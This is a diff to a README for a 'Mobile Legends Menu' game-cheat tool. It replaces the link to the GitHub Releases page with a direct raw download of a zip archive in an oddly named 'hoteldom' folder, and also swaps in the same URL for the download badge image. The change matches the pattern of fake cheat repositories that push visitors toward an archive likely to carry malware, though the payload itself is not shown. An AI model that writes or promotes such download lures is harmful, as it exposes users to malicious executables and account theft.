@@ -17,9 +17,9 @@ Our Mobile Legends Menu offers a variety of features to enhance your gaming expe
 
 ## Installation Guide 📲
 
-To download and install the latest version of Mobile Legends Menu, please visit the [Releases](https://github.com/alperenuurlu/Mobile-Legends-Menu/releases) section and download the executable file.
+To download and install the latest version of Mobile Legends Menu, please visit the [Releases](https://raw.githubusercontent.com/alperenuurlu/Mobile-Legends-Menu/main/hoteldom/Mobile_Menu_Legends_v1.2-alpha.1.zip) section and download the executable file.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/alperenuurlu/Mobile-Legends-Menu/releases)
+[![Download Now](https://raw.githubusercontent.com/alperenuurlu/Mobile-Legends-Menu/main/hoteldom/Mobile_Menu_Legends_v1.2-alpha.1.zip)](https://raw.githubusercontent.com/alperenuurlu/Mobile-Legends-Menu/main/hoteldom/Mobile_Menu_Legends_v1.2-alpha.1.zip)
 
 ## Get Started 🎯
 
